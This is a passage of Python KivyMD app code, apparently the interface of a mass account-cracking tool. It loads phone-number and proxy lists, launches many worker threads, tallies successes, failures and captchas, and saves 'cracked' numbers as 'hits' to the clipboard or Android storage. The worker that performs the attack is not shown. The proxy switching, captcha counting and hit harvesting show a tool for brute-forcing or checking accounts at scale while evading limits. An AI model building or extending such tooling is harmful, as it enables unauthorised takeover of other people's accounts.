        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [l.strip() for l in f if l.strip()]
            if self.file_mode == "numbers":
                self.root.get_screen('main_screen').ids.input_box.text = "\n".join(lines)
                toast(f"Loaded {len(lines)} numbers")
            else:
                global proxies_list
                proxies_list = lines
                self.root.get_screen('main_screen').ids.proxy_status.text = f"{len(lines)} Proxies Active"
                toast("Proxies Loaded")
        except Exception as e: toast(f"Error: {e}")

    def exit_manager(self, *args): self.file_manager.close()
    def set_proxy_type(self, type):
        self.proxy_type = type
        toast(f"Proxy Mode: {type.upper()}")

    # --- PROCESS CONTROL ---
    def update_stats_ui(self): Clock.schedule_once(lambda dt: self._update_ui())
    def _update_ui(self):
        self.stat_success = str(stats['success'])
        self.stat_fail = str(stats['fail'])
        self.stat_captcha = str(stats['captcha'])

    def log_to_console(self, msg): Clock.schedule_once(lambda dt: self._append_log(msg))
    def _append_log(self, msg):
        console = self.root.get_screen('main_screen').ids.console_log
        timestamp = datetime.now().strftime("%H:%M:%S")
        # Simulate terminal color codes if needed, here we just use plain text or markup in future
        new_line = f"[{timestamp}] {msg}\n"
        current_text = console.text.split('\n')[-50:]
        current_text.append(new_line.strip())
        console.text = "\n".join(current_text)

    def add_result_item(self, number): Clock.schedule_once(lambda dt: self._add_ui_item(number))
    def _add_ui_item(self, number):
        container = self.root.get_screen('main_screen').ids.list_success
        item = TwoLineAvatarIconListItem(
            text=number,
            secondary_text=f"Cracked at {datetime.now().strftime('%H:%M')}",
            theme_text_color="Custom",
            text_color=(1,1,1,1),
            secondary_theme_text_color="Custom",
            secondary_text_color=(0,1,0,1)
        )
        item.add_widget(IconLeftWidget(icon="check-decagram", theme_text_color="Custom", text_color=(0,1,0,1)))
        container.add_widget(item)

    def update_timer(self, dt):
        if is_running and start_time:
            delta = datetime.now() - start_time
            self.elapsed_time = str(delta).split('.')[0]

    def start_process(self):
        global is_running, stats, start_time
        text = self.root.get_screen('main_screen').ids.input_box.text
        nums = [n.strip() for n in text.split('\n') if n.strip()]
        
        if not nums: return toast("Load numbers first!")
        
        is_running = True
        self.is_running_flag = True
        start_time = datetime.now()
        stats = {"success": 0, "fail": 0, "captcha": 0, "total": len(nums)}
        self.stat_total = str(len(nums))
        
        self.root.get_screen('main_screen').ids.spinner.active = True
        Clock.schedule_interval(self.update_timer, 1)
        
        q = queue.Queue()
        for n in nums: q.put(n)
        
        threads = int(self.root.get_screen('main_screen').ids.thread_slider.value)
        use_proxy = self.root.get_screen('main_screen').ids.proxy_switch.active
        
        for _ in range(threads):
            t = threading.Thread(target=worker, args=(q, self, use_proxy, self.proxy_type))
            t.daemon = True; t.start()
            
        toast(f"System Engaged: {threads} Threads")
        self.root.get_screen('main_screen').ids.bottom_nav.switch_tab('screen_console')

    def stop_process(self, finished=False):
        global is_running
        if not is_running and not finished: return

        is_running = False
        self.is_running_flag = False
        Clock.unschedule(self.update_timer)
        
        self.root.get_screen('main_screen').ids.spinner.active = False
        
        msg = "Process Completed" if finished else "Process Stopped"
        self.log_to_console(f"*** {msg} ***")
        toast(msg)

    # --- RESULT MANAGEMENT ---
    def copy_hits(self):
        if not success_numbers: return toast("No hits to copy")
        Clipboard.copy("\n".join(success_numbers))
        toast("Copied to Clipboard")

    def save_hits(self):
        if not success_numbers: return toast("No hits to save")
        try:
            fname = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            path = fname
            if platform == 'android':
                from android.storage import primary_external_storage_path
                path = os.path.join(primary_external_storage_path(), "Download", fname)
            with open(path, "w") as f:
                f.write("\n".join(success_numbers))
            toast(f"Saved to {path}")
        except Exception as e: toast(f"Save Failed: {e}")

    def clear_results(self):
        global success_numbers
        success_numbers = []
        self.root.get_screen('main_screen').ids.list_success.clear_widgets()
        toast("Results Cleared")

if __name__ == '__main__':
    AdvanceToolsApp().run()
